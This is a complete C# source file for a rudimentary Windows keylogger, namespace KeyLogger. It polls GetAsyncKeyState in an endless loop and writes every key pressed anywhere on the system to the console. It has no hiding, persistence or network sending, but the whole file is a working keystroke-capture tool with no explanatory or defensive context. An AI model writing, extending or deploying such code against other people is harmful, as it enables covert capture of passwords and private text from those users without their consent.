using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Runtime.InteropServices;
using System.Windows.Forms;


namespace KeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        if (((Keys)i) == Keys.Space) 
                        {
                            Console.Write(" "); 
                            continue;
                        } 
                        else if (((Keys)i) == Keys.Enter) 
                        {
                            Console.Write("\r\n");
                            continue;
                        }
                        else if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton)
                        {
                            continue;
                        } 
                        else if (((Keys)i).ToString().Length == 1)
                        {
                            Console.Write((Keys)i);
                        }
                        else
                        {
                            Console.Write($"<{((Keys)i)}>");
                        }                                                                  
                    }
                }
            }
        }
    }
}
